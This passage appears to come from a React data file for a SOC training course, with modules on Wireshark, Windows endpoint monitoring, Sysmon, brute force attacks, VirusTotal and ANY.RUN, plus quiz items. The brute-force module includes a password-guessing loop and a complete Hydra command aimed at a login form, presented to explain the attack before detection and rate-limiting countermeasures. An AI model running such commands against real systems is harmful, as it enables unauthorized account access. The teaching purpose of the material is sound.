                Wireshark is a free, open-source network protocol analyzer that allows you to capture and examine network traffic in real time. It is widely used by network administrators, security professionals, and forensic investigators to troubleshoot network issues and analyze suspicious traffic.
              </p>
              <p>
                <strong>Key Features of Wireshark:</strong>
              </p>
              <ul>
                <li>
                  <strong>Packet Capture:</strong> Capture live network data from various interfaces.
                </li>
                <li>
                  <strong>Filtering:</strong> Apply display filters to isolate specific traffic (e.g., <code>http</code>, <code>tcp.port==80</code>).
                </li>
                <li>
                  <strong>Protocol Analysis:</strong> Dissect protocols and view detailed packet information.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> To start capturing traffic on the <code>eth0</code> interface:
              </p>
              <pre>{`sudo wireshark -i eth0`}</pre>
              <p>
                Once traffic is captured, you can apply filters such as <code>ip.addr==192.168.1.10</code> to narrow down the analysis to specific hosts.
              </p>
              <p>
                Wireshark is a critical tool for gaining insight into the behavior of network protocols and for identifying potential security incidents.
              </p>
            </>
          )
        },
        {
          title: "Wireshark Traffic Analysis",
          summary: (
            <>
              <p><strong>Advanced Wireshark Traffic Analysis</strong></p>
              <p>
                Beyond basic packet capture, Wireshark offers powerful features for in-depth traffic analysis. Analysts can use advanced filters, follow streams, and utilize statistical tools to uncover patterns and anomalies in network traffic.
              </p>
              <p>
                <strong>Advanced Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Display Filters:</strong> Use complex filters to isolate traffic. For example, to view only HTTP GET requests:
                  <br /><code>http.request.method == "GET"</code>
                </li>
                <li>
                  <strong>Follow TCP Stream:</strong> Right-click on a packet and select “Follow TCP Stream” to view an entire conversation between endpoints.
                </li>
                <li>
                  <strong>Statistics Tools:</strong> Wireshark provides “Protocol Hierarchy,” “Conversations,” and “Endpoints” statistics to analyze traffic volume and distribution.
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An analyst suspects that a specific device is involved in data exfiltration. By filtering traffic for that device’s IP and following the TCP stream, the analyst uncovers repeated large file transfers to an external server. A sample filter could be:
              </p>
              <pre>{`ip.addr == 192.168.1.50 && tcp.port == 443`}</pre>
              <p>
                These advanced features enable detailed forensic analysis and help security professionals pinpoint abnormal behaviors.
              </p>
            </>
          )
        },
        {
          title: "Challenge",
          summary: (
            <>
Link to Challenge page here
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "Which tool is most commonly used for network traffic analysis?",
            options: [
              "Wireshark",
              "Photoshop",
              "Excel",
              "WordPress"
            ],
            correctAnswer: "Wireshark"
          }
        ]
      }
    },
    {
      id: "module8",
      title: "Endpoint Security",
      sections: [
        {
          title: "Intro to Endpoint Security",
          summary: (
            <>
              <p><strong>Introduction to Endpoint Security</strong></p>
              <p>
                Endpoint security focuses on protecting individual devices—desktops, laptops, mobile devices, and servers—from cyber threats. It is a critical component of an organization’s overall security strategy, as endpoints are common targets for malware, ransomware, and unauthorized access.
              </p>
              <p>
                Effective endpoint security solutions integrate multiple layers of protection, including antivirus software, endpoint detection and response (EDR) systems, host-based intrusion prevention systems (HIPS), and strict configuration management. These combined defenses help to prevent, detect, and respond to security incidents at the device level.
              </p>
              <p>
                <strong>Key Objectives:</strong>
              </p>
              <ul>
                <li><strong>Prevention:</strong> Block malicious software and unauthorized access using antivirus and system hardening techniques.</li>
                <li><strong>Detection:</strong> Monitor for anomalous behavior that might indicate compromise, such as unexpected processes or abnormal network traffic.</li>
                <li><strong>Response:</strong> Quickly isolate and remediate compromised endpoints to prevent lateral movement and further damage.</li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> In a corporate environment, an EDR solution might detect unusual behavior—such as a process launching from a temporary folder with a suspicious command line—and immediately alert the security team, who can then isolate the affected device from the network.
              </p>
              <p>
                Robust endpoint security is essential because compromised endpoints can provide attackers with a foothold in the larger network. Implementing multi-layered defenses ensures that even if one measure fails, others are in place to protect the organization.
              </p>
            </>
          )
        },
        {
          title: "Windows Processes",
          summary: (
            <>
              <p><strong>Monitoring and Analyzing Windows Processes</strong></p>
              <p>
                Windows processes represent all active applications and services running on a system. Monitoring these processes is critical for detecting anomalies that could indicate malware or unauthorized activity.
              </p>
              <p>
                <strong>Key Tools and Techniques:</strong>
              </p>
              <ul>
                <li>
                  <strong>Task Manager:</strong> Provides a quick overview of active processes and resource usage.
                </li>
                <li>
                  <strong>Command-Line Utilities:</strong> Use <code>tasklist</code> to display running processes. For example:
                  <br /><code>tasklist /FI "STATUS eq RUNNING"</code>
                </li>
                <li>
                  <strong>PowerShell:</strong> Retrieve detailed process information:
                  <br /><code>Get-Process | Sort-Object CPU -Descending</code>
                </li>
                <li>
                  <strong>Process Explorer (Sysinternals):</strong> Offers detailed insights into process hierarchies, loaded modules, and resource consumption.
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> An analyst might discover an unfamiliar process consuming high CPU on a critical server. By using PowerShell or Process Explorer, the analyst can trace the process's origin and determine whether it is legitimate or potentially malicious.
              </p>
              <p>
                Effective monitoring of Windows processes helps identify early signs of compromise, enabling prompt response and remediation.
              </p>
            </>
          )
        },
        {
          title: "Sysinternals",
          summary: (
            <>
              <p><strong>Overview of the Sysinternals Suite</strong></p>
              <p>
                The Sysinternals Suite is a powerful set of utilities from Microsoft designed to diagnose, monitor, and troubleshoot Windows systems. These tools provide deep insights into system operations, helping security professionals identify suspicious activity and conduct forensic investigations.
              </p>
              <p>
                <strong>Key Tools:</strong>
              </p>
              <ul>
                <li>
                  <strong>Process Explorer:</strong> Delivers detailed information about running processes, including parent-child relationships, loaded modules, and resource usage.
                </li>
                <li>
                  <strong>Autoruns:</strong> Lists all applications configured to run at startup, helping to uncover hidden or malicious auto-start entries.
                </li>
                <li>
                  <strong>Process Monitor:</strong> Combines file system, registry, and process/thread monitoring for comprehensive system activity analysis.
                </li>
                <li>
                  <strong>TCPView:</strong> Offers a real-time view of all TCP and UDP endpoints, which can help in detecting unusual network connections.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Use Process Explorer to identify a suspicious process and examine its associated DLLs.
                </li>
                <li>
                  Autoruns can reveal malicious persistence mechanisms by listing all startup entries.
                </li>
                <li>
                  Process Monitor can be filtered to show only registry changes made by a particular process.
                </li>
              </ul>
              <p>
                The Sysinternals tools are indispensable for in-depth system analysis, providing the granularity needed to detect stealthy attacks.
              </p>
            </>
          )
        },
        {
          title: "Windows Event Log",
          summary: (
            <>
              <p><strong>Understanding Windows Event Logs</strong></p>
              <p>
                Windows Event Logs serve as a vital source of system and security data. They record events related to system operations, application activities, and security-related incidents such as login attempts and access changes.
              </p>
              <p>
                <strong>Key Log Types:</strong>
              </p>
              <ul>
                <li>
                  <strong>Security Logs:</strong> Capture events like successful and failed logins, user account changes, and resource access events.
                </li>
                <li>
                  <strong>System Logs:</strong> Record operating system events including hardware issues and driver errors.
                </li>
                <li>
                  <strong>Application Logs:</strong> Log events generated by software applications and services.
                </li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  Use the Windows Event Viewer to inspect security logs for Event IDs such as 4624 (successful logon) and 4625 (failed logon).
                </li>
                <li>
                  Retrieve recent events using PowerShell:
                  <br /><code>Get-EventLog -LogName Security -Newest 100</code>
                </li>
              </ul>
              <p>
                Analyzing Windows Event Logs provides crucial insights into user activity and potential security breaches, enabling effective incident response and forensic investigations.
              </p>
            </>
          )
        },
        {
          title: "Sysmon",
          summary: (
            <>
              <p><strong>Introduction to Sysmon</strong></p>
              <p>
                Sysmon (System Monitor) is a Windows system service that provides detailed information about system activity. Part of the Sysinternals suite, Sysmon logs events such as process creations, network connections, and changes to file creation times, which are invaluable for detecting advanced threats.
              </p>
              <p>
                <strong>Key Features:</strong>
              </p>
              <ul>
                <li>
                  <strong>Process Creation Logging:</strong> Captures detailed data about process creations, including command-line arguments and file hashes.
                </li>
                <li>
                  <strong>Network Connection Logging:</strong> Records outbound network connections to help identify potential command-and-control (C2) communications.
                </li>
                <li>
                  <strong>File Creation Time Changes:</strong> Monitors alterations in file creation times, which can be a sign of tampering.
                </li>
              </ul>
              <p>
                <strong>Configuration Example:</strong> Sysmon is configured using an XML file. A sample snippet:
              </p>
              <pre>{`<Sysmon schemaversion="4.22">
      <EventFiltering>
        <ProcessCreate onmatch="include">
          <CommandLine condition="contains">-exec</CommandLine>
        </ProcessCreate>
        <NetworkConnect onmatch="include" />
      </EventFiltering>
    </Sysmon>`}</pre>
              <p>
                Deploying Sysmon provides granular visibility into endpoint behavior, enabling security teams to detect and analyze sophisticated threats that bypass traditional antivirus solutions.
              </p>
            </>
          )
        },
        {
          title: "Challenge",
          summary: (
            <>
              <p><strong>Endpoint Security Challenge</strong></p>
Link to sysmon challenge page here
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is a key aspect of endpoint security?",
            options: [
              "Monitoring system processes",
              "Designing websites",
              "Social media management",
              "Graphic design"
            ],
            correctAnswer: "Monitoring system processes"
          }
        ]
      }
    },
    {
      id: "module9",
      title: "Brute Force Attacks",
      sections: [
        {
          title: "Introduction to Brute Force Attacks",
          summary: (
            <>
              <p><strong>Introduction to Brute Force Attacks</strong></p>
              <p>
                Brute force attacks are one of the simplest yet most potent techniques used by attackers to gain unauthorized access. In a brute force attack, an adversary systematically attempts every possible combination of passwords or encryption keys until the correct one is found. This method exploits weak or poorly managed authentication systems.
              </p>
              <p>
                Despite its simplicity, the effectiveness of a brute force attack depends on factors such as password complexity, account lockout policies, and available computational resources. When robust security measures are absent, even basic brute force methods can lead to successful breaches.
              </p>
              <p>
                <strong>Key Concepts:</strong>
              </p>
              <ul>
                <li>
                  <strong>Exhaustive Search:</strong> Trying every possible combination until the correct credential is found.
                </li>
                <li>
                  <strong>Dictionary Attack:</strong> Using precompiled lists of common passwords.
                </li>
                <li>
                  <strong>Distributed Brute Force:</strong> Utilizing multiple machines or a botnet to parallelize attempts.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> Consider an online service with weak password requirements. An attacker may use an automated tool to try thousands of passwords in rapid succession. If the service does not implement rate limiting or lockout mechanisms, the attacker might eventually guess the correct password.
              </p>
              <p>
                In summary, brute force attacks highlight the need for strong authentication policies and multi-factor authentication to prevent unauthorized access.
              </p>
            </>
          )
        },
        {
          title: "How Brute Force Attacks Work",
          summary: (
            <>
              <p><strong>Mechanics of a Brute Force Attack</strong></p>
              <p>
                A brute force attack works by systematically attempting every possible password or key combination until the correct one is discovered. This process is typically automated using specialized software, which can run through millions of possibilities per second, especially with the aid of distributed computing.
              </p>
              <p>
                <strong>Steps Involved:</strong>
              </p>
              <ol>
                <li>
                  <strong>Target Selection:</strong> The attacker selects a target system or account.
                </li>
                <li>
                  <strong>Preparation of a Password List:</strong> This may be a dictionary of common passwords or a generated list based on expected complexity.
                </li>
                <li>
                  <strong>Automated Guessing:</strong> The attack tool systematically tests each password until the correct one is found.
                </li>
                <li>
                  <strong>Successful Authentication:</strong> Once the correct password is discovered, the attacker gains access to the system.
                </li>
              </ol>
              <p>
                <strong>Example Code Snippet (Pseudo-code):</strong>
              </p>
              <pre>{`for (let i = 0; i < possiblePasswords.length; i++) {
      if (authenticate(user, possiblePasswords[i])) {
        console.log("Password found:", possiblePasswords[i]);
        break;
      }
    }`}</pre>
              <p>
                In real-world scenarios, tools like Hydra or John the Ripper are used to automate these attacks. For example, an attacker might run:
              </p>
              <pre>{`hydra -L users.txt -P passwords.txt targetsite.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"`}</pre>
              <p>
                This command uses user and password lists to systematically try combinations against a login form until a valid credential is found.
              </p>
              <p>
                Understanding the mechanics of brute force attacks is essential for designing effective countermeasures.
              </p>
            </>
          )
        },
        {
          title: "Detecting Brute Force Attacks",
          summary: (
            <>
              <p><strong>Detection Techniques for Brute Force Attacks</strong></p>
              <p>
                Detecting brute force attacks involves monitoring authentication logs and network traffic for patterns that indicate a large number of failed attempts. Because these attacks typically generate an abnormally high volume of login failures or connection attempts, they can be identified through automated analysis.
              </p>
              <p>
                <strong>Key Detection Methods:</strong>
              </p>
              <ul>
                <li>
                  <strong>Log Analysis:</strong> Examine authentication logs for repeated failed login attempts. SIEM systems can be configured to alert when the number of failed attempts exceeds a threshold.
                </li>
                <li>
                  <strong>Rate Limiting:</strong> Implement controls that restrict the number of login attempts within a specific timeframe.
                </li>
                <li>
                  <strong>Anomaly Detection:</strong> Use behavioral analytics to identify deviations from normal login patterns.
                </li>
              </ul>
              <p>
                <strong>Example SIEM Query (Splunk):</strong>
              </p>
              <pre>{'index=security sourcetype=auth_logs "failed login" | stats count by src_ip | where count &gt; 10'}</pre>
              <p>
                This query detects IP addresses that have generated more than 10 failed login attempts, indicating a possible brute force attack.
              </p>
              <p>
                <strong>Real-World Example:</strong> An IDS detects multiple failed login attempts from the same IP within a short time window and alerts the security team. Such detections help in taking immediate action, like blocking the offending IP.
              </p>
              <p>
                Early detection is key to mitigating the impact of brute force attacks before attackers can compromise accounts.
              </p>
            </>
          )
        },
        {
          title: "Mitigation and Prevention",
          summary: (
            <>
              <p><strong>Strategies to Mitigate and Prevent Brute Force Attacks</strong></p>
              <p>
                Mitigating brute force attacks involves implementing a combination of technical controls, policy measures, and user education to make unauthorized access exceedingly difficult. The goal is to increase the complexity and cost of an attack to the point where it becomes impractical.
              </p>
              <p>
                <strong>Key Prevention Strategies:</strong>
              </p>
              <ul>
                <li>
                  <strong>Strong Password Policies:</strong> Enforce complexity, length, and regular updates to make passwords less susceptible to brute force attempts.
                </li>
                <li>
                  <strong>Account Lockout Policies:</strong> Automatically lock an account after a specified number of failed login attempts.
                </li>
                <li>
                  <strong>Multi-Factor Authentication (MFA):</strong> Add an extra layer of security by requiring additional verification beyond just a password.
                </li>
                <li>
                  <strong>CAPTCHAs:</strong> Incorporate CAPTCHAs on login forms to differentiate between human users and automated scripts.
                </li>
                <li>
                  <strong>Rate Limiting:</strong> Limit the number of login attempts per IP address over a defined period.
                </li>
              </ul>
              <p>
                <strong>Code Snippet Example (Express/Node.js):</strong>
              </p>
              <pre>{`const rateLimit = require('express-rate-limit');
    
    const loginLimiter = rateLimit({
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 5, // limit each IP to 5 login requests per window
      message: "Too many login attempts, please try again later."
    });
    
    app.post('/login', loginLimiter, passport.authenticate('local'));`}</pre>
              <p>
                This snippet demonstrates how rate limiting can be implemented in a Node.js application to mitigate brute force attacks.
              </p>
              <p>
                Implementing these prevention measures is critical to protecting sensitive accounts and minimizing the attack surface.
              </p>
            </>
          )
        },
        {
          title: "Challenge",
          summary: (
            <>
              <p><strong>Brute Force Attack Challenge</strong></p>
              <img
  src="/Challenges/bruteforcechallenge.png"
  alt="bruteforcechallenge"
                className="my-4 w-full max-w-md mx-auto"
/>


              <p>
Go to challange page, and test what you learned!
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What is the primary concern with brute force attacks?",
            options: [
              "Unauthorized access through repeated attempts",
              "Poor web design",
              "Slow internet speed",
              "Excessive file sizes"
            ],
            correctAnswer: "Unauthorized access through repeated attempts"
          }
        ]
      }
    },
    {
      id: "module10",
      title: "Virustotal for SOC",
      sections: [
        {
          title: "Importance of VirusTotal in SOC operations",
          summary: (
            <>
              <p><strong>Why VirusTotal is Critical for SOC Operations</strong></p>
              <p>
                VirusTotal is a widely used threat intelligence platform that aggregates antivirus scan results, file analyses, and URL/domain reputation data from numerous vendors. In a Security Operations Center (SOC), it plays a pivotal role by providing rapid insights into suspicious files, URLs, and network indicators.
              </p>
              <p>
                By leveraging VirusTotal, SOC teams can quickly validate indicators of compromise (IOCs) collected during incident investigations. This helps in determining whether a file is malicious, a URL is part of a phishing campaign, or an IP address is associated with known malicious activity.
              </p>
              <p>
                <strong>Key Benefits:</strong>
              </p>
              <ul>
                <li>
                  <strong>Aggregation of Multiple Scanners:</strong> VirusTotal compiles results from over 70 antivirus engines, ensuring a comprehensive view.
                </li>
                <li>
                  <strong>Rapid Analysis:</strong> The platform provides near-real-time scanning results, essential for fast-paced incident response.
                </li>
                <li>
                  <strong>Community and Threat Intelligence:</strong> Users can comment on and share insights regarding suspicious files and URLs, enriching the overall threat intelligence.
                </li>
                <li>
                  <strong>Integration:</strong> VirusTotal’s API allows SOC teams to integrate its data into SIEM systems for automated correlation and alerting.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> When a suspicious email is flagged by the SOC, its attachments are automatically uploaded to VirusTotal via an API integration. The aggregated scan results reveal that multiple antivirus engines classify the file as malicious. This rapid validation enables the SOC to isolate affected endpoints and initiate remediation procedures.
              </p>
              <p>
                Overall, VirusTotal enhances situational awareness and improves the accuracy and speed of threat detection within the SOC.
              </p>
            </>
          )
        },
        {
          title: "File Analysis",
          summary: (
            <>
              <p><strong>Analyzing Files with VirusTotal</strong></p>
              <p>
                File analysis in VirusTotal involves submitting files for scanning against a vast number of antivirus engines and behavioral analysis tools. This process not only detects known malware but also provides contextual information such as file metadata, static signatures, and, in some cases, dynamic behavior.
              </p>
              <p>
                <strong>How It Works:</strong> Users upload a file to VirusTotal, which then calculates its hash (e.g., MD5, SHA-1, SHA-256) and checks it against its database. If the file is new, VirusTotal will scan it using multiple antivirus engines.
              </p>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Command-Line Example:</strong> Using cURL to submit a file via the VirusTotal API:
                  <br /><code>{`curl --request POST --url https://www.virustotal.com/api/v3/files --header "x-apikey: YOUR_API_KEY" --form file=@/path/to/file`}</code>
                </li>
                <li>
                  <strong>Manual Analysis:</strong> Analysts can review the VirusTotal report to see which engines flagged the file, along with detailed metadata and community comments.
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> A SOC analyst receives a suspicious executable from an endpoint alert. After uploading the file to VirusTotal, they discover that 15 out of 70 antivirus engines flag it as malware, and additional analysis reveals its connection to a known botnet. This information is then used to quarantine the endpoint and launch a broader investigation.
              </p>
              <p>
                File analysis via VirusTotal provides an essential layer of validation and insight for incident responders, ensuring that potential threats are quickly and accurately identified.
              </p>
            </>
          )
        },
        {
          title: "URL and Domain Analysis",
          summary: (
            <>
              <p><strong>Analyzing URLs and Domains with VirusTotal</strong></p>
              <p>
                VirusTotal also offers robust analysis for URLs and domains. When a URL is submitted, the platform checks it against multiple threat databases, scans for malicious content, and evaluates its reputation. This is particularly useful for detecting phishing sites, malicious redirects, and compromised web pages.
              </p>
              <p>
                <strong>How It Works:</strong> Users can submit URLs via the VirusTotal website or API. The service then analyzes the URL, examining factors such as:
              </p>
              <ul>
                <li>Domain registration details</li>
                <li>SSL certificate validity</li>
                <li>Historical data and reputation</li>
                <li>Presence of malicious scripts or redirects</li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Command-Line Example:</strong> Using cURL to check a URL:
                  <br /><code>{`curl --request GET --url "https://www.virustotal.com/api/v3/urls/{encoded_url}" --header "x-apikey: YOUR_API_KEY"`}</code>
                </li>
                <li>
                  <strong>Manual Analysis:</strong> Reviewing the URL analysis report on VirusTotal, which shows detailed scanning results and community comments.
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> A SOC analyst receives an alert about a suspicious email containing a URL. They submit the URL to VirusTotal and find that it has been associated with phishing campaigns. The URL analysis report includes multiple detections and user comments, confirming its malicious nature. This enables the SOC team to block the domain across the organization.
              </p>
              <p>
                URL and domain analysis are critical for proactive threat detection, especially in environments where phishing and web-based attacks are prevalent.
              </p>
            </>
          )
        },
        {
          title: "IP Address Analysis",
          summary: (
            <>
              <p><strong>Leveraging VirusTotal for IP Address Analysis</strong></p>
              <p>
                In addition to file and URL analysis, VirusTotal can be used to analyze IP addresses. This function helps in identifying whether an IP address is associated with malicious activity, such as command-and-control servers, spam operations, or data exfiltration points.
              </p>
              <p>
                <strong>How It Works:</strong> An IP address can be submitted to VirusTotal, where it is checked against various threat intelligence databases and antivirus engines. The report may include:
              </p>
              <ul>
                <li>Geolocation information</li>
                <li>Historical reputation data</li>
                <li>Associated domains and URLs</li>
                <li>Community comments and scan results</li>
              </ul>
              <p>
                <strong>Examples:</strong>
              </p>
              <ul>
                <li>
                  <strong>Command-Line Example:</strong> Using the VirusTotal API to analyze an IP address:
                  <br /><code>{`curl --request GET --url "https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8" --header "x-apikey: YOUR_API_KEY"`}</code>
                </li>
                <li>
                  <strong>Manual Review:</strong> An analyst can review the report on VirusTotal’s website to see if the IP address has been flagged as malicious by multiple sources.
                </li>
              </ul>
              <p>
                <strong>Real-World Scenario:</strong> Suppose a SOC analyst identifies unusual outbound traffic from a specific IP address on the network. Submitting the IP to VirusTotal reveals that it is associated with known malicious activity and has been reported in multiple threat intelligence feeds. This confirms the suspicion and triggers further investigation.
              </p>
              <p>
                IP address analysis in VirusTotal is a powerful tool for correlating network activity with known threat data, providing critical context during investigations.
              </p>
            </>
          )
        },
        {
          title: "Advanced Features",
          summary: (
            <>
              <p><strong>Exploring Advanced Features of VirusTotal</strong></p>
              <p>
                Beyond basic file, URL, and IP analysis, VirusTotal offers several advanced features that can greatly enhance the capabilities of a SOC. These features include historical data, automated submissions, and integration with other security tools via its API.
              </p>
              <p>
                <strong>Key Advanced Features:</strong>
              </p>
              <ul>
                <li>
                  <strong>Historical Analysis:</strong> Access historical scan data and trends over time to track the evolution of a threat.
                </li>
                <li>
                  <strong>Automated API Integration:</strong> Use the VirusTotal API to automate the submission of files, URLs, and IP addresses, integrating the results into SIEM systems or custom dashboards.
                </li>
                <li>
                  <strong>Community Feedback and Comments:</strong> Leverage insights and discussions from the VirusTotal community to enhance threat intelligence.
                </li>
                <li>
                  <strong>Sandbox Analysis:</strong> Some VirusTotal reports include behavioral analysis from sandboxed environments, showing how a file behaves during execution.
                </li>
              </ul>
              <p>
                <strong>Example Integration:</strong> A SOC might use a script to automatically submit suspicious files from endpoint alerts to VirusTotal and then parse the results to decide on further action.
              </p>
              <p>
                <strong>Sample Code Snippet (Python):</strong>
              </p>
              <pre>{`import requests
    import json
    
    api_key = "YOUR_API_KEY"
    file_path = "suspicious_file.exe"
    url = "https://www.virustotal.com/api/v3/files"
    
    with open(file_path, "rb") as f:
        files = {"file": f}
        headers = {"x-apikey": api_key}
        response = requests.post(url, files=files, headers=headers)
        result = response.json()
        print(json.dumps(result, indent=4))
    `}</pre>
              <p>
                This script uploads a file to VirusTotal and prints the scan results in a formatted JSON structure.
              </p>
              <p>
                Advanced features enable SOC teams to streamline threat analysis, improve response times, and maintain a robust threat intelligence platform by leveraging automated workflows and historical data trends.
              </p>
            </>
          )
        }
      ],
      quiz: {
        questions: [
          {
            id: 1,
            question: "What does VirusTotal help analyze?",
            options: [
              "Files, URLs, and IP addresses",
              "Graphic designs",
              "Stock prices",
              "Weather data"
            ],
            correctAnswer: "Files, URLs, and IP addresses"
          }
        ]
      }
    },
    {
      id: "module11",
      title: "Anyrun for SOC",
      sections: [
        {
          title: "What is ANY.RUN?",
          summary: (
            <>
              <p><strong>What is ANY.RUN?</strong></p>
              <p>
                ANY.RUN is an advanced, interactive malware analysis sandbox designed for cybersecurity professionals—from students to seasoned experts. The platform enables users to detect, analyze, and monitor cybersecurity threats in real time. With its intuitive interface, ANY.RUN simplifies the process of conducting thorough and effective malware investigations.
              </p>
              <p>
                Founded in 2016, ANY.RUN has quickly established itself as a leading platform for malware detection and analysis. Today, over 150,000 malware analysts use the service daily, and organizations across sectors such as finance, healthcare, and trading trust ANY.RUN to safeguard their data.
              </p>
              <p>
                ANY.RUN provides an interactive environment where analysts can observe malware behavior, track network communications, and review system modifications as they happen. This real-time interactivity makes it easier to understand how malicious code operates and to develop effective countermeasures.
              </p>
              <p>
                <strong>Key Highlights:</strong>
              </p>
              <ul>
                <li>Real-time analysis of malware behavior</li>
                <li>Interactive sandbox environment</li>
                <li>Comprehensive threat intelligence and collaboration features</li>
                <li>Support for multiple operating systems and configurations</li>
              </ul>
              <p>
                By using ANY.RUN, SOC teams gain valuable insights into the tactics, techniques, and procedures of attackers, helping to reduce response times and improve overall threat mitigation.
              </p>
            </>
          )
        },
        {
          title: "Key Features of ANY.RUN",
          summary: (
            <>
              <p><strong>Key Features of ANY.RUN</strong></p>
              <p>
                ANY.RUN offers a wide array of features that make it a powerful tool for malware analysis and threat intelligence. Its design is centered on interactivity and flexibility, allowing analysts to customize their analysis environment.
              </p>
              <p>
                <strong>Major Features Include:</strong>
              </p>
              <ul>
                <li>
                  <strong>Interactive Malware Analysis:</strong> Analysts can interact with malware samples in real time, simulating user actions to observe behavioral changes.
                </li>
                <li>
                  <strong>Public Tasks and Collaboration:</strong> The platform’s "Public Tasks" feature allows users to share their investigations. This collaborative approach enriches threat intelligence and aids in the rapid identification of Indicators of Compromise (IOCs).
                </li>
                <li>
                  <strong>Comprehensive Reporting:</strong> ANY.RUN generates detailed reports that include a final verdict, summaries of IOCs, process behavior graphs, and more. These reports facilitate quick decision-making and effective incident response.
                </li>
                <li>
                  <strong>Advanced Filtering:</strong> Analysts can filter public submissions by hash, file type, verdict, tags, and other parameters, making it easier to conduct OSINT investigations.
                </li>
                <li>
                  <strong>Configuration Flexibility:</strong> ANY.RUN supports multiple operating systems (such as Windows 7, 10, 11, and Ubuntu) and offers various configurations (Clean, Office, Complete) to simulate different environments.
                </li>
              </ul>
              <p>
                <strong>Real-World Example:</strong> An analyst investigating a ransomware incident can use ANY.RUN to simulate the infection process under different configurations. By comparing behavior across environments, the analyst can determine which security controls failed and which mitigation strategies are most effective.
              </p>
            </>
          )
        },
        {
          title: "Understanding Verdicts in ANY.RUN",
          summary: (
            <>
              <p><strong>Understanding Verdicts in ANY.RUN</strong></p>
              <p>
                ANY.RUN categorizes the results of its malware analysis into three primary verdicts: <strong>Malicious</strong>, <strong>Suspicious</strong>, and <strong>No Threats Detected</strong>. These verdicts help analysts quickly assess the threat level of a sample.
              </p>
              <p>
                <strong>Verdict Categories:</strong>
              </p>
              <ul>
                <li>
                  <strong>Malicious:</strong> The sample exhibits clear malicious behavior, such as creating backdoors or exfiltrating data.
                </li>
                <li>
                  <strong>Suspicious:</strong> The sample shows potential indicators of malicious activity, but the evidence is not conclusive.
                </li>
                <li>
                  <strong>No Threats Detected:</strong> The sample does not display any behavior indicative of a threat.
                </li>
              </ul>
              <p>
                <strong>Example:</strong> After analyzing a suspicious executable, ANY.RUN may determine it as "Malicious" if it attempts to contact known command-and-control servers and modifies critical system files. Conversely, if the behavior is ambiguous, it might be marked as "Suspicious" for further review.
              </p>
              <p>
                These verdicts enable SOC teams to prioritize incidents and allocate resources efficiently, focusing on the most critical threats first.
              </p>
            </>
          )
        },
        {
          title: "Tags and Indicators in ANY.RUN",
          summary: (
            <>
              <p><strong>Tags and Indicators in ANY.RUN</strong></p>
              <p>
                Tags and indicators in ANY.RUN are used to classify and highlight specific characteristics of malware samples. They provide quick visual cues about the behavior and nature of the analyzed threat.
              </p>
              <p>
                <strong>Tags:</strong> Tags categorize malware based on its behavior or type. For example:
              </p>
              <ul>
                <li>
                  <strong>Malware Family Tags:</strong> Indicate the malware family (e.g., Trojan, Stealer, Ransomware).
                </li>
                <li>
                  <strong>Macros Tags:</strong> Identify the presence of macros in documents, which may be used to execute malicious code.
                </li>
                <li>
                  <strong>Phishing Tags:</strong> Flag samples associated with phishing activities.
                </li>
                <li>
                  <strong>CVE Tags:</strong> Link the sample to known vulnerabilities.
                </li>
              </ul>
              <p>
                <strong>Indicators:</strong> Visual cues in ANY.RUN reports that help track malware behavior in real time. These include icons representing execution stages, network connections, file modifications, and other critical events.
              </p>
              <p>
                <strong>Real-World Example:</strong> An analyst reviewing a sample might see a "Ransomware" tag along with indicators showing attempts to encrypt files and contact external servers. This immediate visual context aids in rapid threat assessment.
              </p>
              <p>
                Tags and indicators are essential for organizing and prioritizing threat data, enabling analysts to quickly understand and respond to emerging threats.
              </p>
            </>
          )
        },
        {
          title: "Interactive Malware Analysis",
          summary: (
            <>
              <p><strong>What is Interactive Malware Analysis?</strong></p>
              <p>
                Interactive malware analysis is an advanced form of dynamic analysis that allows analysts to interact with malware in real time. Unlike traditional sandbox environments, ANY.RUN provides a live, interactive interface where you can observe malware behavior as it unfolds.
              </p>
              <p>
                <strong>Benefits of Interactive Analysis:</strong>
              </p>
              <ul>
                <li>
                  <strong>Real-Time Interaction:</strong> Analysts can pause, resume, and step through malware execution to understand its behavior.
                </li>
                <li>
                  <strong>Enhanced Visibility:</strong> Direct observation of processes, network communications, and file modifications provides deeper insights into how malware operates.
                </li>
                <li>
                  <strong>Flexibility:</strong> You can rerun tasks with different configurations, such as varying OS versions or application environments, to see how the malware adapts.
                </li>
                <li>
                  <strong>Faster Data Collection:</strong> Dynamic interaction speeds up the process of identifying IOCs (Indicators of Compromise).
                </li>
              </ul>
              <p>
                <strong>Example Scenario:</strong> An analyst may interactively test a malware sample by manually triggering specific functions and observing the resulting network traffic and system changes. This process helps pinpoint exact behaviors that are used for persistence or lateral movement.
              </p>
              <p>
                Overall, interactive malware analysis provides a level of detail and context that is invaluable for understanding sophisticated threats and improving defensive measures.
              </p>
            </>
          )
        },
        {
          title: "Writing Malware Analysis Reports",
          summary: (
            <>
              <p><strong>Writing Comprehensive Malware Analysis Reports</strong></p>
              <p>
                Detailed reporting is a key component of malware analysis. ANY.RUN automatically generates reports that summarize the behavior, indicators, and overall risk associated with a malware sample. These reports are crucial for documenting findings and guiding incident response.
              </p>
              <p>
                <strong>Key Components of a Report:</strong>
              </p>
              <ul>
                <li>
                  <strong>Summary:</strong> A brief overview of the malware, its detected behaviors, and the final verdict.
                </li>
                <li>
                  <strong>General Information:</strong> Details such as file size, hash values, and antivirus detection rates.
                </li>
                <li>
